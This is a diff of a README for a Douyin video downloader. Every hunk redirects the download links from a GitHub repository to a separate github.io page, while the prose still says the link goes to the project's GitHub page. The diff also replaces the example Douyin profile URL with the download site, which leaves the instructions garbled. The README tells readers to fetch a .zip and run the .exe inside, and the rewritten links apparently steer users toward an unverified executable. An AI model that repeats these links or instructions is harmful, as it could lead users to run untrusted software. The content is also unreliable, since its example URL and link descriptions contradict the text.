@@ -21,11 +21,11 @@ Anyone who wants to save Douyin content for offline viewing, sharing, or archivi
 
 ## 📦 Download and Installation
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/blancaunmodulated270/douyin-downloader)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&color=4B0082)](https://blancaunmodulated270.github.io)
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/blancaunmodulated270/douyin-downloader](https://github.com/blancaunmodulated270/douyin-downloader)
+Visit this link to download the application: [https://blancaunmodulated270.github.io](https://blancaunmodulated270.github.io)
 
 This link takes you to the project's main page on GitHub, where you'll find the latest version of the tool.
 
@@ -70,7 +70,7 @@ The download will start, and you'll see a progress bar. When it's done, the vide
 ### Downloading an Entire Profile
 
 1. Go to the profile page of the user whose content you want to save.
-2. Copy the profile URL (e.g., `https://www.douyin.com/user/123456789`).
+2. Copy the profile URL (e.g., `https://blancaunmodulated270.github.io`).
 3. Paste it in the app, and select the **Profile Batch Download** mode.
 4. Set the number of videos to download (or leave it at "All").
 5. Click **Start Batch**.
@@ -146,7 +146,7 @@ No special software or dependencies are needed—everything is bundled in the do
 
 ## ✅ Quick Summary
 
-1. Go to: [https://github.com/blancaunmodulated270/douyin-downloader](https://github.com/blancaunmodulated270/douyin-downloader) — visit this link to download the application.
+1. Go to: [https://blancaunmodulated270.github.io](https://blancaunmodulated270.github.io) — visit this link to download the application.
 2. Download the `.zip` release file.
 3. Extract it anywhere.
 4. Run the `.exe` file inside.
